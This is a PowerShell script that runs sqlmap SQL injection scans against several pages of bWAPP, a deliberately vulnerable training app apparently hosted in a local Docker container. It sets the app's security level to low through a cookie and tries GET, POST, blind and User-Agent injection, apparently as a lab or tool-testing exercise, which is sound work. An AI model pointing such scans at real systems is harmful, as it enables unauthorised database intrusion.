# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "bwapp"
$sqlmap_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.sqlmap))
$output_dir = Join-Path $PSScriptRoot $config.output_raw

$url_get_search = $config.environment.bwapp_docker + "/sqli_1.php?title=123&action=search"
$url_post_search = $config.environment.bwapp_docker + "/sqli_6.php"
$url_blindB = $config.environment.bwapp_docker + "/sqli_4.php?title=123&action=search"
$url_blindT = $config.environment.bwapp_docker + "/sqli_15.php?title=123&action=search"
$url_user_agent = $config.environment.bwapp_docker + "/sqli_17.php"

$phpsessid = $config.targets.$target.phpsessid
$cookie_low = "security_level=0; PHPSESSID={0}" -f $phpsessid
$request = Join-Path $PSScriptRoot $config.targets.$target.request_file


python $sqlmap_path -u "$url_get_search" --cookie="$cookie_low" --batch --output-dir="$output_dir\bwapp_low"

python $sqlmap_path -u "$url_post_search" --data="title=it&action=search" --cookie="$cookie_low" --batch --output-dir="$output_dir\bwapp_low"

python $sqlmap_path -u "$url_blindB" --cookie="$cookie_low" --technique=B --level 2 --batch --output-dir="$output_dir\bwapp_low"

python $sqlmap_path -u "$url_blindT" --cookie="$cookie_low" --technique=T --level 2 --batch --output-dir="$output_dir\bwapp_low"

python $sqlmap_path -r "$request" --cookie="$cookie_low" --technique=ET --dbms=mysql --risk 3 --batch --output-dir="$output_dir\bwapp_low"
# Without --technique=ET, sqlmap regards User-Agent as false positive

